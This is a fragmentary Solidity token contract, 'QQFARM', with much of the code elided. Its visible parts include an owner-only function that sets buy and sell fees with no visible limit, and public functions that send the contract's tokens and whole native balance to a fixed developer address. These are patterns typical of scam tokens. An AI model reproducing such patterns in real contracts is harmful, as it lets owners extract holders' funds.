...
contract QQFARM is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "QQFARM";
    string private _symbol = "QF";
    uint8 private  _decimals = 8;
    address private immutable dev;
    address payable public marketingWalletAddress = payable(0x787E515DeFCD20fB2629d339a2a6B92771350Bb0); 
    ...
    uint256 private _totalSupply = 200 * 10**4* 10**_decimals;
    ...
    function swapAndLiquify(uint256 tAmount) private lockTheSwap {
        ...
        uint256 amountReceived = address(this).balance/2;
    ...
    function setLMB(uint L, uint M , uint B)public onlyOwner{
        _buyLiquidityFee=L;
        _buyMarketingFee = M;
        _buyBurnedFee = B;
        _sellLiquidityFee = L;
    ...
    function release () public {
        ...
        _basicTransfer(address(this),dev,amount);
    }

    function WithdrawBNB() public  {
        transferToAddressETH(payable(dev), address(this).balance);  
    }

    function setminimumTokensBeforeSwap(uint amount )public onlyOwner {
